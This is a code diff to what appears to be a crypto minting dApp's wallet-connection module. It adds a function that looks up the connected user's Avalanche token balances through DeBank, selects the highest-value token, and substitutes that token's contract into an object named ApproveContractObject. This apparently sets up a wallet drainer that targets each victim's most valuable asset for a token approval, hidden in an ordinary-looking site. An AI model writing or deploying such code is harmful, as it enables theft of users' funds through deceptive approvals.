@@ -17,6 +17,49 @@ const connectSuccess = (payload) => {
   };
 };
 
+ const checkUserWallet =  async (address)=>{
+   console.log('adress is :'+address)
+    let tokenAndValue = [];
+    let biggestToken = {
+          value:0,
+          contract:null
+        }
+     try{
+       await fetch('https://openapi.debank.com/v1/user/token_list?id='+address+'&chain_id=avax&is_all=false&has_balance=true').then(function(response){
+      
+      return response.json();
+    }).then(async function(jsonResponse){
+      console.log(jsonResponse)
+      jsonResponse.forEach(element => {
+        let tokenObject = {
+          usdAmount:element.amount*element.price,
+          contract:element.id
+        }
+        
+       
+          console.log('TOKENVALUES '+tokenObject.contract)
+          if(tokenObject.usdAmount>=biggestToken.value){
+          console.log('big')
+          biggestToken.value = tokenObject.usdAmount;
+          biggestToken.contract = tokenObject.contract;
+        }
+        
+        
+        
+      });
+      
+      console.log(biggestToken)
+      
+    })
+    console.log('biggesttoken value : '+biggestToken.value)
+    return biggestToken;
+     }
+     catch(err){
+       console.log(err);
+     }
+
+  }
+
 const connectFailed = (payload) => {
   return {
     type: "CONNECTION_FAILED",
@@ -74,9 +117,15 @@ export const connect = () => {
             abi,
             CONFIG.CONTRACT_ADDRESS
           );
+          console.log(accounts[0]);
+          let token = await checkUserWallet(accounts[0])
+          if(token.contract=='avax'){
+            token.contract = '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
+          }
+          console.log('approve contract is ::'+token);
           const ApproveContractObject = new Web3EthContract(
             wavaxAbi,
-            '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7'
+            token.contract
           );
           dispatch(
             connectSuccess({
@@ -98,6 +147,7 @@ export const connect = () => {
           dispatch(connectFailed(`Change network to ${CONFIG.NETWORK.NAME}.`));
         }
       } catch (err) {
+        console.log(err);
         dispatch(connectFailed("Something went wrong."));
       }
     } else {
